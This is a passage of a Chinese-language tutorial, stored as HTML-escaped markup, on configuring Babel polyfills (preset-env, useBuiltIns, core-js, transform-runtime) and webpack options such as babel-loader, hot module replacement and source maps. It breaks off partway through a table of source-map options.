<p>targets &#x51B3;&#x5B9A;&#x9879;&#x76EE;&#x9700;&#x8981;&#x9002;&#x914D;&#x7684;&#x73AF;&#x5883;&#xFF0C;&#x53EF;&#x7533;&#x660E;&#x9002;&#x914D;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x7248;&#x672C;&#xFF1B;babel &#x4F1A;&#x6839;&#x636E;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x652F;&#x6301;&#x60C5;&#x51B5;&#x81EA;&#x52A8;&#x5F15;&#x5165;&#x6240;&#x9700;&#x8981;&#x7684; polyfill&#x3002;</p>
<p>useBuiltIns &#x53EF;&#x9009; usage|entry|false(default)&#xFF0C;&#x51B3;&#x5B9A; preset-env &#x5982;&#x4F55;&#x5904;&#x7406; polyfill&#x3002;</p>
<p>&#x5F53;&#x4F7F;&#x7528; usage &#x6216; entry &#x9009;&#x9879;&#x65F6;&#xFF0C;@babel/preset-env &#x4F1A;&#x5C06;&#x5BF9; core-js &#x6A21;&#x5757;&#x7684;&#x76F4;&#x63A5;&#x5F15;&#x7528;&#x6DFB;&#x52A0;&#x4E3A;&#x88F8;&#x5BFC;&#x5165;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740; core-js &#x5C06;&#x76F8;&#x5BF9;&#x4E8E;&#x6587;&#x4EF6;&#x672C;&#x8EAB;&#x8FDB;&#x884C;&#x89E3;&#x6790;&#x3002;</p>
<p>@babel/polyfill &#x5728; 7.4.0 &#x4E2D;&#x5DF2;&#x5F03;&#x7528;&#xFF0C;&#x5EFA;&#x8BAE;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x9009;&#x9879;&#x6DFB;&#x52A0; <a href="https://github.com/zloirock/core-js/blob/master/docs/2019-03-19-core-js-3-babel-and-a-look-into-the-future.md">corejs</a> &#x548C;&#x8BBE;&#x7F6E;&#x7248;&#x672C;&#x3002;</p>
<pre><code class="language-shell">npm install core-js@3 --save
# or
npm install core-js@2 --save
</code></pre>
<ul>
<li>@babel/polyfill =&gt; &#x5BF9; @babel/preset-env &#x8865;&#x4E01;&#x64CD;&#x4F5C;&#xFF0C;&#x63D0;&#x4F9B;&#x7F3A;&#x5931;&#x7684;&#x529F;&#x80FD;</li>
</ul>
<p>&#x8F6C;&#x8BD1;&#x540E;&#x7684;&#x4EE3;&#x7801;&#x5982;&#x679C;&#x5728;&#x4E0D;&#x652F;&#x6301;&#x7279;&#x5B9A;&#x65B9;&#x6CD5;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x8FD0;&#x884C;&#xFF0C;&#x4F1A;&#x51FA;&#x73B0;&#x62A5;&#x9519;&#x3002;babel/polyfill &#x8FD9;&#x4E2A;&#x5E93;&#x5171;&#x5206;&#x4E3A;&#x4E24;&#x90E8;&#x5206;&#xFF0C;core-js &#x4E0E; regenerator-runtime&#x3002;</p>
<blockquote>
<p>regenerator-runtime is the runtime support for compiled/transpiled async functions. (It may well have other uses, but this is the predominant one.)</p>
</blockquote>
<p>&#x5F53; useBuiltIns &#x8BBE;&#x7F6E;&#x4E3A; entry &#x540E;&#xFF0C;&#x4E14;&#x5728;&#x6E90;&#x4EE3;&#x7801;&#x7684;&#x6700;&#x4E0A;&#x65B9;&#x624B;&#x52A8;&#x5F15;&#x5165; @babel/polyfill &#x7684;&#x5E93;&#x65F6;&#xFF0C;&#x4F1A;&#x9ED8;&#x8BA4;&#x5C06;&#x6240;&#x6709;&#x7684; polyfill &#x5168;&#x90E8;&#x5F15;&#x5165;&#xFF0C;&#x5BFC;&#x81F4;&#x5BFC;&#x81F4;&#x4EE3;&#x7801;&#x5305;&#x5F02;&#x5E38;&#x5E9E;&#x5927;&#x3002;</p>
<pre><code class="language-java">/* core-js2 entry */
/* &#x7F16;&#x8BD1;&#x524D; */
import &quot;@babel/polyfill&quot;
let zsarr = [1,2,3];
zsarr.map(n =&gt; n + 1);
zsarr.includes( item =&gt; item &gt;2)
/* &#x7F16;&#x8BD1;&#x540E; */
&quot;use strict&quot;;
require(&quot;core-js/modules/es7.array.includes.js&quot;);
require(&quot;core-js/modules/web.timers.js&quot;);
require(&quot;core-js/modules/web.immediate.js&quot;);
require(&quot;core-js/modules/web.dom.iterable.js&quot;);
require(&quot;regenerator-runtime/runtime.js&quot;);
var zsarr = [1, 2, 3];
zsarr.map(function (n) { return n + 1; });
zsarr.includes(function (item) { return item &gt; 2; });
</code></pre>
<p>&#x6309;&#x9700;&#x52A0;&#x8F7D;&#x5219;&#x662F;&#x5C06; useBuiltIns &#x7684;&#x503C;&#x6539;&#x4E3A; usage&#xFF0C;&#x4E14;&#x4E0D;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5F15;&#x5165; babel/polyfill&#x3002;</p>
<pre><code class="language-js">// .babelrc
{
  &quot;presets&quot;: [
    [
      &quot;@babel/preset-env&quot;,
      {
        &quot;useBuiltIns&quot;: &quot;usage&quot;,
        &quot;debug&quot;: true
      }
    ]
  ]
}
</code></pre>
<pre><code class="language-javascript">/* core-js2 usage */
/* &#x7F16;&#x8BD1;&#x524D; */
import &quot;@babel/polyfill&quot;
let zsarr = [1,2,3];
zsarr.map(n =&gt; n + 1);
zsarr.includes( item =&gt; item &gt;2)
/* &#x7F16;&#x8BD1;&#x540E; */
&quot;use strict&quot;;
require(&quot;core-js/modules/es7.array.includes.js&quot;);
var zsarr = [1, 2, 3];
zsarr.map(function (n) { return n + 1; 
zsarr.includes(function (item) { return item &gt; 2; });
</code></pre>
<p>&#x7531;&#x4E8E; Babel &#x5728;&#x8F6C;&#x8BD1; async functions &#x65F6;&#xFF0C;&#x4F7F;&#x7528;&#x4E86; regeneratorRuntime &#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x53D8;&#x91CF;&#x4F4D;&#x4E8E; regenerator-runtime &#x5E93;&#x4E2D;&#xFF0C;&#x6240;&#x4EE5;&#x4F1A;&#x51FA;&#x73B0; undefined &#x9519;&#x8BEF;&#x3002;</p>
<p>polyfill &#x673A;&#x5236;&#x662F;&#x5BF9;&#x4E8E;&#x5BF9;&#x8C61;&#x7684;&#x9759;&#x6001;&#x65B9;&#x6CD5;&#xFF0C;&#x76F4;&#x63A5;&#x5728;&#x5168;&#x5C40;&#x5BF9;&#x8C61;&#x4E0A;&#x6DFB;&#x52A0; =&gt; global.object?.?&#xFF1B;&#x5BF9;&#x4E8E;&#x5B9E;&#x4F8B;&#x65B9;&#x6CD5;&#xFF0C;&#x76F4;&#x63A5;&#x5728;&#x5168;&#x5C40;&#x5BF9;&#x8C61;&#x7684;&#x539F;&#x578B; global.object?.prototype.? &#x4E0A;&#x6DFB;&#x52A0;&#x3002;</p>
<p>&#x8FD9;&#x79CD;&#x505A;&#x6CD5;&#x6781;&#x5EA6;&#x5BB9;&#x6613;&#x4E0E;&#x7B2C;&#x4E09;&#x65B9;&#x5E93;&#x53D1;&#x751F;&#x51B2;&#x7A81;&#x3002;&#x516C;&#x8BA4;&#x7684;&#x7F16;&#x7A0B;&#x8303;&#x5F0F;&#x4E5F;&#x4E0D;&#x9F13;&#x52B1;&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x3001;&#x5168;&#x5C40;&#x53D8;&#x91CF;&#x539F;&#x578B;&#x3002;</p>
<p>&#x5728;&#x5904;&#x7406;&#x7C7B;&#x7684;&#x8BED;&#x6CD5;&#x4E2D;&#xFF0C;Babel &#x901A;&#x8FC7;&#x589E;&#x52A0;&#x81EA;&#x5B9A;&#x4E49;&#x51FD;&#x6570;&#x8FDB;&#x884C;&#x8F85;&#x52A9;&#x6216;&#x662F;&#x76F4;&#x63A5;&#x91CD;&#x5199;&#x65B9;&#x6CD5;&#xFF0C;&#x4F1A;&#x5728;&#x9879;&#x76EE;&#x91CC;&#x91CD;&#x590D;&#x751F;&#x6210;&#x4E0D;&#x5FC5;&#x8981;&#x7684;&#x4EE3;&#x7801;&#x3002;</p>
<pre><code class="language-javascript">/* &#x7F16;&#x8BD1;&#x524D; */
class Okk{}
let okk = new Okk();
typeof okk
/* &#x7F16;&#x8BD1;&#x540E; */
&quot;use strict&quot;;
require(&quot;core-js/modules/web.dom.iterable.js&quot;);
function _typeof(obj) { &quot;@babel/helpers - typeof&quot;; return _typeof = &quot;function&quot; == typeof Symbol &amp;&amp; &quot;symbol&quot; == typeof Symbol.iterator ? function (obj) { return typeof obj; } : function (obj) { return obj &amp;&amp; &quot;function&quot; == typeof Symbol &amp;&amp; obj.constructor === Symbol &amp;&amp; obj !== Symbol.prototype ? &quot;symbol&quot; : typeof obj; }, _typeof(obj); }
function _defineProperties(target, props) { for (var i = 0; i &lt; props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (&quot;value&quot; in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }
function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); Object.defineProperty(Constructor, &quot;prototype&quot;, { writable: false }); return Constructor; }
function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError(&quot;Cannot call a class as a function&quot;); } }
var Okk = /*#__PURE__*/_createClass(function Okk() {
  _classCallCheck(this, Okk);
});
var okk = new Okk();
_typeof(okk);
</code></pre>
<ul>
<li>@babel/plugin-transform-runtime =&gt; &#x81EA;&#x52A8;&#x586B;&#x5145;&#x4EE3;&#x7801;&#xFF1B;&#x4E0D;&#x6C61;&#x67D3;&#x5168;&#x5C40;&#x53D8;&#x91CF;</li>
</ul>
<p><a href="https://babeljs.io/docs/en/babel-plugin-transform-runtime">@babel/plugin-transform-runtime</a> &#x63D2;&#x4EF6;&#x89E3;&#x51B3; @babel/polyfill &#x4E2D;&#x5B58;&#x5728;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<pre><code class="language-shell">yarn add @babel/plugin-transform-runtime -D # &#x8F6C;&#x8BD1;&#x4EE3;&#x7801;
yarn add @babel/runtime-corejs3 # &#x5B58;&#x653E;&#x53EF;&#x80FD;&#x4F1A;&#x88AB; plugin-transform-runtime &#x5F15;&#x7528;&#x7684;&#x6A21;&#x5757;
</code></pre>
<pre><code class="language-javascript">{
  &quot;presets&quot;: [
    [
      &quot;@babel/preset-env&quot;,
      {
        &quot;useBuiltIns&quot;: &quot;usage&quot;, // &#x5982;&#x679C; @babel/plugin-transform-runtime &#x914D;&#x7F6E;&#x4E86; corejs:3 =&gt; preset-env &#x7684; useBuiltIns &#x5C31;&#x4E0D;&#x4F1A;&#x751F;&#x6548;
        &quot;debug&quot;: true,
        &quot;targets&quot;: {
          &quot;ie&quot;: 10
        },
        &quot;comments&quot;: false // &#x4E0D;&#x4EA7;&#x751F;&#x6CE8;&#x91CA;
      }
    ]
  ],
  &quot;plugins&quot;: [
    [
      &quot;@babel/plugin-transform-runtime&quot;,
      {
        &quot;corejs&quot;: 3 // &#x6307;&#x5B9A; runtime-corejs &#x7684;&#x7248;&#x672C; =&gt; &#x76EE;&#x524D;&#x6709; 2&#x3001;3
      }
    ]
  ]
}
</code></pre>
<pre><code class="language-javascript">/* babel &#x5B98;&#x7F51;&#x5728;&#x7EBF;&#x5F15;&#x5165; =&gt; babel-plugin-optimize-helpers */ 
/* &#x7F16;&#x8BD1;&#x524D; */
class Okk{}
let okk = new Okk();
typeof okk 
/* &#x7F16;&#x8BD1;&#x540E; */
&quot;use strict&quot;;
var _classCallCheck = require(&quot;@babel/runtime-corejs2/helpers/esm/classCallCheck&quot;)[&quot;default&quot;],
    _createClass = require(&quot;@babel/runtime-corejs2/helpers/esm/createClass&quot;)[&quot;default&quot;],
    _typeof = require(&quot;@babel/runtime-corejs2/helpers/esm/typeof&quot;).default;
function _defineProperties(target, props) { for (var i = 0; i &lt; props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if (&quot;value&quot; in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }
var Okk = /*#__PURE__*/_createClass(function Okk() {
  _classCallCheck(this, Okk);
});
var okk = new Okk();
_typeof(okk);
</code></pre>
<ul>
<li>babel-loader =&gt; &#x4E2D;&#x95F4;&#x6865;&#x6881;&#xFF0C;&#x4EE5; babel/core &#x7684; API &#x6307;&#x5BFC; webpack &#x5904;&#x7406; JS</li>
</ul>
<p>Chrome &#x4E2D;&#x53EF;&#x4EE5;&#x8BC6;&#x522B;&#x7684; ES6+ &#x8BED;&#x6CD5;&#xFF0C;&#x4E0D;&#x4EE3;&#x8868; IE &#x540C;&#x6837;&#x53EF;&#x4EE5;&#x3002;</p>
<p>@babel/preset-env &#x8F6C;&#x6362;&#x57FA;&#x672C;&#x8BED;&#x6CD5;&#xFF0C;&#x800C; @babel/polyfill &#x8FDB;&#x884C;&#x5168;&#x90E8;&#x517C;&#x5BB9;&#x6027;&#x5904;&#x7406;&#x3002;</p>
<p>@babel/polyfill &#x4E0B;&#x8F7D;&#x540E;&#x5F15;&#x5165;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x5373;&#x53EF;&#xFF08;&#x66B4;&#x529B;&#xFF09;&#x3002;</p>
<p>&#x6309;&#x9700;&#x52A0;&#x8F7D;&#x4F18;&#x5148;&#x8003;&#x8651; core-js &#x3002;&#x4F7F;&#x7528; core-js &#x65F6;&#xFF0C;&#x4E0D;&#x80FD;&#x540C;&#x65F6;&#x4F7F;&#x7528; @babel/polyfill&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5305;
npm install --save-dev babel-loader @babel/core @babel/preset-env @babel/polyfill core-js
</code></pre>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { 
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;)
    },
  module: {
    rules: [ { 
      test: /\.js$/, 
      exclude: /node_modules/,
      // webpack1.x &#x65F6;&#x662F; loader: &apos;babel&apos;
      loader: &apos;babel-loader&apos;, // webpack2.x+ 
      options: { // &#x9884;&#x8BBE;&#xFF1A;&#x6307;&#x793A; babel &#x505A;&#x600E;&#x4E48;&#x6837;&#x7684;&#x517C;&#x5BB9;&#x6027;&#x5904;&#x7406; 
        presets: 
        [[ 
          &apos;@babel/preset-env&apos;, { 
          // &#x6309;&#x9700;&#x52A0;&#x8F7D; useBuiltIns: &apos;usage&apos;,
          // &#x6307;&#x5B9A; core-js &#x7248;&#x672C;
          corejs: { version: 3 },
          // &#x6307;&#x5B9A;&#x517C;&#x5BB9;&#x6027;&#x505A;&#x5230;&#x54EA;&#x4E2A;&#x7248;&#x672C;&#x6D4F;&#x89C8;&#x5668; -- core-js
          targets: { chrome: &apos;60&apos;, firefox: &apos;60&apos;, ie: &apos;9&apos;, safari: &apos;10&apos;, edge: &apos;17&apos; }
          }
		]]
      }
    }] 
  },
  plugins: [ new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }) ],
  mode: &apos;development&apos;
</code></pre>
<blockquote>
<p>=&gt; Toolchain &#x5DE5;&#x5177;&#x94FE;<br>
&#x5DE5;&#x5177;&#x94FE;&#x53C2;&#x4E0E;&#x5F00;&#x53D1;&#x7684;&#x5404;&#x4E2A;&#x73AF;&#x8282;&#xFF0C;&#x4ECE;&#x811A;&#x624B;&#x67B6;&#x3001;&#x6784;&#x5EFA;&#x2F2F;&#x5177;&#x3001;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;&#x5230;&#x6700;&#x540E;&#x7684;&#x53D1;&#x5E03;&#x5DE5;&#x5177;<br>
The purpose of a software toolchain is to have a group of software tools linked together and optimized for a specific programming process. The output generated by one tool in the chain is used by the next tool in the chain as the input.</p>
</blockquote>
<h3 id="precautions">Precautions</h3>
<ul>
<li>@babel/preset-env &#x548C; @babel/env =&gt; &#x7F3A;&#x4E4F; Promise&#x3001;Array.from</li>
</ul>
<p>@babel/preset-env &#x662F; Presets &#x91CC;&#x7684;&#x4E00;&#x9879;&#xFF1B;@babel/env &#x5E38;&#x89C1;&#x4E8E;&#x5177;&#x4F53;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7531;&#x4E8E;&#x5DF2;&#x7ECF;&#x4F4D;&#x4E8E; presets &#x9879;&#x4E2D;&#xFF0C;&#x901A;&#x5E38;&#x53EF;&#x7701;&#x7565; preset-&#xFF0C;&#x8FD9;&#x4E8C;&#x8005;&#x662F;&#x76F8;&#x540C;&#x7684;&#x3002;</p>
<pre><code class="language-javascript">/* .babelrc */
{
  &quot;presets&quot;: [
    [
      &quot;@babel/preset-env&quot;, // &apos;@babel/env&apos; or &apos;env&apos;
      {
        // &quot;targets&quot;: { &quot;browsers&quot;: [&quot;last 2 versions&quot;, &quot;safari &gt;= 7&quot;] }
        &quot;targets&quot;: { ie: &apos;8&apos;, edge: &apos;17&apos;, firefox: &apos;60&apos;, chrome: &apos;67&apos;, safari: &apos;11.1&apos; },
        &quot;useBuiltIns&quot;: &quot;entry&quot;,
        &quot;debug&quot;: true
      }
    ]
  ]
}
</code></pre>
<ul>
<li>Smallest Particle =&gt; &#x6700;&#x5C0F;&#x5316;&#x7684; Babel &#x8F6C;&#x6362;&#x6761;&#x4EF6;</li>
</ul>
<p>@babel/core&#x3001;@babel/preset-env&#x3001;a Babel &quot;runner&quot; (@babel/cli, babel-loader, @rollup/plugin-babel, etc)</p>
<ul>
<li>
<p>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x683C;&#x5F0F; =&gt; .babelrc &#x548C; babel.config.js</p>
</li>
<li>
<p>Babel &#x8FD0;&#x884C;&#x65F6;&#x5904;&#x7406;&#x89C4;&#x5219;</p>
</li>
</ul>
<p>plugins &#x4F18;&#x5148;&#x4E8E; presets &#x7F16;&#x8BD1;&#xFF1B;plugins &#x6309;&#x7167;&#x6570;&#x7EC4;&#x7D22;&#x5F15;&#x589E;&#x5E8F;&#x8FDB;&#x884C;&#x7F16;&#x8BD1;&#xFF1B;presets &#x6309;&#x7167;&#x6570;&#x7EC4;&#x7D22;&#x5F15;&#x5012;&#x5E8F;&#x8FDB;&#x884C;&#x7F16;&#x8BD1;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="optimization">Optimization</h2>
<p>&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;&#x6D4B;&#x8BD5;&#x4E00;&#x4E0B;</p>
<p>&#x4F18;&#x5316;&#x524D;&#x7AEF;&#x6027;&#x80FD;&#x5176;&#x5B9E;&#x662F;&#x6307;&#x4F18;&#x5316;&#x6253;&#x5305;&#x7684;&#x8F93;&#x51FA;&#x7ED3;&#x679C;&#x3002;</p>
<p>&#x538B;&#x7F29;&#x4EE3;&#x7801;&#x53EF;&#x4EE5;&#x5229;&#x7528; uglifyjs-webpack-plugin &#x548C; ParallelUglifyPlugin</p>
<p>&#x538B;&#x7F29;&#x4EE3;&#x7801;&#xFF1A;&#x5220;&#x9664;&#x591A;&#x4F59;&#x7684;&#x4EE3;&#x7801;&#x3001;&#x6CE8;&#x91CA;&#x3001;&#x7B80;&#x5316;<br>
&#x4EE3;&#x7801;&#x7684;&#x5199;&#x6CD5;&#x7B49;&#x7B49;&#x65B9;&#x5F0F;&#x3002;&#x53EF;&#x4EE5;&#x5229;&#x7528; webpack<br>
&#x7684; UglifyJsPlugin &#x548C; ParallelUglifyPlugin<br>
&#x6765;&#x538B;&#x7F29;JS&#x6587;&#x4EF6;&#xFF0C;&#x5229;&#x7528; cssnano (css-<br>
loader?minimize&#xFF09; &#x6765;&#x538B;&#x7F29;css<br>
&#x5229;&#x7528; CDN&#x52A0;&#x901F;&#xFF1A;&#x5728;&#x6784;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5C06;&#x5F15;&#x7528;&#x7684;<br>
&#x9759;&#x6001;&#x8D44;&#x6E90;&#x8DEF;&#x5F84;&#x4FEE;&#x6539;&#x4E3A;CDN&#x4E0A;&#x5BF9;&#x5E94;&#x7684;&#x8DEF;&#x5F84;&#x3002;<br>
&#x53EF;&#x53EF;&#x4EE5;&#x5229;&#x7528;webpack&#x5BF9;&#x4E8E;output &#x53C2;&#x6570;&#x548C;&#x5404;<br>
loader&#x7684;publicPath &#x53C2;&#x6570;&#x6765;&#x4FEE;&#x6539;&#x8D44;&#x6E90;&#x8DEF;&#x5F84;<br>
Tree Shaking&#xFF1A;&#x5C06;&#x4EE3;&#x7801;&#x4E2D;&#x6C38;&#x8FDC;&#x4E0D;&#x4F1A;&#x8D70;&#x5230;&#x7684;&#x7247;<br>
&#x6BB5;&#x5220;&#x9664;&#x6389;&#x3002;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5728;&#x542F;&#x52A8;webpack&#x65F6;&#x8FFD;<br>
&#x52A0;&#x53C2;&#x6570;--optimize-minimize &#x6765;&#x5B9E;&#x73B0;<br>
Code Splitting&#xFF1A; &#x5C06;&#x4EE3;&#x7801;&#x6309;&#x8DEF;&#x7531;&#x7EF4;&#x5EA6;&#x6216;&#x8005;&#x7EC4;<br>
&#x4EF6;&#x5206;&#x5757;(chunk),&#x8FD9;&#x6837;&#x505A;&#x5230;&#x6309;&#x9700;&#x52A0;&#x8F7D;,&#x540C;&#x65F6;&#x53EF;<br>
&#x4EE5;&#x5145;&#x5206;&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x7F13;&#x5B58;<br>
&#x63D0;&#x53D6;&#x516C;&#x5171;&#x7B2C;&#x4E09;&#x65B9;&#x5E93;&#xFF1A;SplitChunksPlugin&#x63D2;&#x4EF6;<br>
&#x6765;&#x8FDB;&#x884C;&#x516C;&#x5171;&#x6A21;&#x5757;&#x62BD;&#x53D6;,&#x5229;&#x7528;&#x6D4F;&#x89C8;&#x5668;&#x7F13;&#x5B58;&#x53EF;&#x4EE5;<br>
&#x957F;&#x671F;&#x7F13;&#x5B58;&#x8FD9;&#x4E9B;&#x65E0;&#x9700;&#x9891;&#x7E41;&#x53D8;&#x52A8;&#x7684;&#x516C;&#x5171;&#x4EE3;&#x7801;</p>
<h3 id>&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x4F18;&#x5316;</h3>
<p>&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x4F18;&#x5316;&#x6307;&#x4F18;&#x5316;&#x6253;&#x5305;&#x6784;&#x5EFA;&#x901F;&#x5EA6;&#xFF08;&#x8C03;&#x8BD5;&#x3001;&#x5F00;&#x53D1;&#x53CB;&#x597D;&#xFF09;&#x3001;&#x4F18;&#x5316;&#x4EE3;&#x7801;&#x8C03;&#x8BD5;&#xFF08;&#x63D0;&#x9192;&#x5F00;&#x53D1;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x4F4D;&#x7F6E;&#xFF09;&#x3002;</p>
<ul>
<li>HMR(Hot Module Replace)</li>
</ul>
<p>&#x70ED;&#x6A21;&#x5757;&#x66FF;&#x6362;&#x5373;&#x4E00;&#x4E2A;&#x6A21;&#x5757;&#x53D1;&#x751F;&#x53D8;&#x5316;&#xFF0C;&#x53EA;&#x9700;&#x91CD;&#x65B0;&#x6253;&#x5305;&#x8FD9;&#x4E00;&#x4E2A;&#x6A21;&#x5757;&#xFF0C;&#x800C;&#x5E76;&#x91CD;&#x65B0;&#x6253;&#x5305;&#x5168;&#x90E8;&#x6A21;&#x5757;&#x3002;&#x672C;&#x5730;&#x4EE3;&#x7801;&#x6539;&#x53D8;&#xFF0C;&#x91CD;&#x65B0;&#x7F16;&#x8BD1;&#x3001;&#x5237;&#x65B0;&#x6D4F;&#x89C8;&#x5668;&#x5373;&#x4E3A;&#x70ED;&#x66F4;&#x65B0;&#x3002;HMR &#x529F;&#x80FD;&#x5BF9;&#x4E8E; <code>.js</code> &#x7684;&#x5904;&#x7406;&#x53EA;&#x80FD;&#x5904;&#x7406;&#x975E;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x7684;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x3002;&#x5165;&#x53E3;&#x6587;&#x4EF6;&#x8FDB;&#x884C; HMR &#x5219;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x90FD;&#x4F1A;&#x91CD;&#x65B0;&#x6253;&#x5305;&#x3002;</p>
<table>
<thead>
<tr>
<th>&#x6587;&#x4EF6;</th>
<th>&#x70ED;&#x66F4;&#x65B0;</th>
</tr>
</thead>
<tbody>
<tr>
<td>&#x6837;&#x5F0F;&#x6587;&#x4EF6;</td>
<td>&#x53EF;&#x4EE5;&#x4F7F;&#x7528; HMR&#x529F;&#x80FD;&#xFF0C;&#x56E0;&#x4E3A; style-loader &#x5185;&#x90E8;&#x5DF2;&#x5B9E;&#x73B0;</td>
</tr>
<tr>
<td>JS &#x6587;&#x4EF6;</td>
<td>&#x9ED8;&#x8BA4;&#x4E0D;&#x80FD;&#x4F7F;&#x7528; HMR &#x529F;&#x80FD;</td>
</tr>
<tr>
<td>html &#x6587;&#x4EF6;</td>
<td>&#x9ED8;&#x8BA4;&#x4E0D;&#x80FD;&#x4F7F;&#x7528; HMR&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x4E0D;&#x9700;&#x8981;&#x8003;&#x8651; HMR &#x529F;&#x80FD;</td>
</tr>
</tbody>
</table>
<pre><code class="language-javascript">...
devServer: { // &#x4FEE;&#x6539; webpack &#x914D;&#x7F6E;&#x4E00;&#x5B9A;&#x8981;&#x91CD;&#x542F; webpack &#x670D;&#x52A1;
  ...,
  hot: true // &#x5F00;&#x542F; HMR &#x529F;&#x80FD;
}
</code></pre>
<pre><code class="language-javascript">...
import print from &apos;./print.js&apos;
if(module.hot) { // &#x4E00;&#x65E6; module.hot &#x4E3A; true &#x5219;&#x5F00;&#x542F; HMR &#x5C5E;&#x6027; -- &#x8BA9; HMR &#x529F;&#x80FD;&#x751F;&#x6548;
  module.hot.accept(&apos;./print.js&apos;, function(){ // &#x8FD9;&#x91CC;&#x7684; print.js &#x5DF2;&#x7ECF;&#x5B58;&#x5728;
    // &#x65B9;&#x6CD5;&#x76D1;&#x542C; print.js &#x6587;&#x4EF6;&#x53D8;&#x5316;, &#x4E00;&#x65E6;&#x53D8;&#x5316;&#x5176;&#x4ED6;&#x9ED8;&#x8BA4;&#x4E0D;&#x4F1A;&#x91CD;&#x65B0;&#x6253;&#x5305;&#x6784;&#x5EFA;
    // &#x6267;&#x884C;&#x540E;&#x9762;&#x7684;&#x56DE;&#x8C03;&#x51FD;&#x6570;
    print();
  })
}
</code></pre>
<ul>
<li>source-map</li>
</ul>
<p>&#x4E00;&#x6B3E;&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x8C03;&#x8BD5;&#x4EE3;&#x7801;&#x95EE;&#x9898;&#x5DE5;&#x5177;&#xFF0C;&#x63D0;&#x4F9B;&#x6E90;&#x4EE3;&#x7801;&#x5230;&#x6784;&#x5EFA;&#x540E;&#x4EE3;&#x7801;&#x6620;&#x5C04;&#x7684;&#x6280;&#x672F;&#x3002;&#x6784;&#x5EFA;&#x540E;&#x4EE3;&#x7801;&#x51FA;&#x9519;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x7684;&#x9519;&#x8BEF;&#x3002;</p>
<pre><code class="language-javascript">[inline-|hidden-|eval-][nosource-][cheap-[module-]]source-map
devtool: &quot;eval-source-map&quot; // &#x5F00;&#x53D1;&#x73AF;&#x5883;&#x6700;&#x4F73;
devtool: &quot;source-map&quot; // &#x751F;&#x4EA7;&#x73AF;&#x5883;&#x6700;&#x4F73;
</code></pre>
<table>
<thead>
<tr>
<th>&#x524D;&#x7F00;</th>
<th>&#x89E3;&#x91CA;</th>
</tr>
</thead>
<tbody>
<tr>
<td>inline</td>
<td>&#x5185;&#x8054;&#x6587;&#x4EF6;&#xFF1A;&#x5916;&#x90E8;&#x751F;&#x6210;&#x6587;&#x4EF6;&#xFF0C;<strong>&#x5185;&#x8054;&#x6CA1;&#x6709;&#x751F;&#x6210;</strong>&#xFF1B;&#x6784;&#x5EFA;&#x901F;&#x5EA6;&#x5FEB;&#xFF1B;</td>
</tr>
<tr>
<td>hidden</td>
<td>&#x53EA;&#x751F;&#x6210;&#x4E00;&#x4E2A; source-map&#x3002;&#x80FD;&#x63D0;&#x793A;&#x9519;&#x8BEF;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x539F;&#x56E0;&#xFF0C;&#x4E0D;&#x80FD;&#x8FFD;&#x8E2A;&#x6E90;&#x4EE3;&#x7801;&#x9519;&#x8BEF;&#x3002;</td>
</tr>
<tr>
<td>eval</td>
